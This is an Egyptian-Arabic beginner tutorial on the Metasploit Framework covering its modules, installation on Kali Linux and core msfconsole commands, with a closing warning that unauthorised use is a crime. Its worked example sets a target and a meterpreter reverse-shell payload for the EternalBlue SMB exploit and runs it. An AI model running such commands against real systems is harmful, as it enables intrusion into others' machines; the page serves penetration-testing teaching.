Metasploit

أشهر إطار لاستغلال الثغرات

يعني إيه Metasploit؟

Metasploit Framework هي أشهر أداة مفتوحة المصدر لاستغلال الثغرات الأمنية. بتوفر قاعدة ضخمة من الـ Exploits (أكواد استغلال) والـ Payloads والـ Auxiliary modules.

الأداة دي بتعتبر الأساس في أي عملية اختبار اختراق متقدمة — وفيها أكتر من 2000 exploit جاهز. وكمان بتدعم عدد كبير من الأنظمة والخدمات.

المكونات

  • Exploits: أكواد استغلال الثغرات
  • Payloads: الأكواد اللي بتتنفذ بعد الاستغلال
  • Auxiliary: أدوات مساعدة (Scanning, Fuzzing)
  • Encoders: تشفير الـ Payloads
  • Post: أوامر بعد الاستغلال

التثبيت

# مش هتشتغل على Termux بسهولة # استخدمها على Kali Linux أو TryHackMe # على Kali Linux sudo apt install metasploit-framework msfconsole

الأوامر الأساسية

1. تشغيل Metasploit

msfconsole

2. البحث عن Exploit

search type:exploit platform:windows smb

3. استخدام Exploit

use exploit/windows/smb/ms17_010_eternalblue

4. عرض الخيارات

show options

5. تعيين الهدف

set RHOSTS 192.168.1.1 set LHOST 192.168.1.4 set PAYLOAD windows/x64/meterpreter/reverse_tcp

6. التنفيذ

exploit

أوامر msfconsole

  • help — المساعدة
  • search — البحث
  • use — استخدام Module
  • show options — الخيارات
  • set — تعيين قيمة
  • exploit أو run — التنفيذ
  • sessions — الجلسات المفتوحة
  • back — رجوع
  • exit — خروج
خطر: Metasploit أداة قوية جداً. استخدامها على أي نظام مش بتاعك = جريمة.
